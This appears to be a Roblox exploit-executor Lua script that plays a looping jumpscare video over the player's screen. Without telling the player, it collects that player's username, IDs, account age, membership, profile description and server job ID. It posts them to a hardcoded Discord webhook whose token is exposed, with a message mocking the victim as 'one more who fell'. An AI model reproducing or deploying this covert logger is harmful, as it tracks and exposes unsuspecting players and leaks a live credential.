if jumpscare_jeffwuz_loaded and not _G.jumpscarefucking123 == true then
	warn("Already Loading")
    return
end

pcall(function() getgenv().jumpscare_jeffwuz_loaded = true end)

getgenv().Notify = true
local Notify_Webhook = "https://discord.com/api/webhooks/1388564177265623050/6k3IFwWJEhXzEqLWSXcsBV19_k64IKxYi3r9MlMbSagTKf25A6-algPOXUR7BpaPRrtf"

if not getcustomasset then
	game:Shutdown() -- Fucked out
end

local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService('HttpService')

local ScreenGui = Instance.new("ScreenGui")
local VideoScreen = Instance.new("VideoFrame")
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.IgnoreGuiInset = true
ScreenGui.Name = "JeffTheKillerWuzHere"

VideoScreen.Parent = ScreenGui
VideoScreen.Size = UDim2.new(1,0,1,0)

writefile("yes.mp4", game:HttpGet("https://github.com/HappyCow91/RobloxScripts/blob/main/Videos/videoplayback.mp4?raw=true"))

VideoScreen.Video = getcustomasset("yes.mp4")

VideoScreen.Looped = true
VideoScreen.Playing = true
VideoScreen.Volume = 10

function notify_hook()
	-- Thumb API
	local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true")
	local json = HttpService:JSONDecode(ThumbnailAPI)
	local avatardata = json.data[1].imageUrl

	-------- User API Script
	local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..player.UserId)
	local json = HttpService:JSONDecode(UserAPI)
	-------- Description Data
	local DescriptionData = json.description
	-------- Created Data
	local CreatedData = json.created

	local send_data = {
		["username"] = "Script Notify",
		["avatar_url"] = "https://i.etsystatic.com/11307494/r/il/4697db/4396403674/il_300x300.4396403674_9fdx.jpg",
		["content"] = "¡Una persona más cayó! @everyone",
		["embeds"] = {
			{
				["title"] = "Script logs",
				["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n\n**Job ID : "..game.JobId.."**",
				["color"] = 4915083,
				["fields"] = {
					{
						["name"] = "Username",
						["value"] = player.Name,
						["inline"] = true
					},
					{
						["name"] = "Display Name",
						["value"] = player.DisplayName,
						["inline"] = true
					},
					{
						["name"] = "User ID",
						["value"] = player.UserId,
						["inline"] = true
					},
					{
						["name"] = "Account Age",
						["value"] = player.AccountAge.." Day",
						["inline"] = true
					},
					{
						["name"] = "Membership",
						["value"] = player.MembershipType.Name,
						["inline"] = true
					},
					{
						["name"] = "Account Created Day",
						["value"] = string.match(CreatedData, "^([%d-]+)"),
						["inline"] = true
					},
					{
						["name"] = "Profile Description",
						["value"] = "```\n"..DescriptionData.."\n```",
						["inline"] = true
					}
				},
				["footer"] = {
					["text"] = "ScriptLog",
					["icon_url"] = "https://i.etsystatic.com/11307494/r/il/4697db/4396403674/il_300x300.4396403674_9fdx.jpg"
				},
				["thumbnail"] = {
					["url"] = avatardata
				}
			}
		},
	}

	local headers = {
		["Content-Type"] = "application/json"
	}

	request({
		Url = Notify_Webhook,
		Method = "POST",
		Headers = headers,
		Body = game:GetService("HttpService"):JSONEncode(send_data)
	})
end

if getgenv().Notify == true then
	if Notify_Webhook == '' then
		return;
	else
		notify_hook()
	end
elseif getgenv().Notify == false then
	return;
else
	warn("True or False")
end
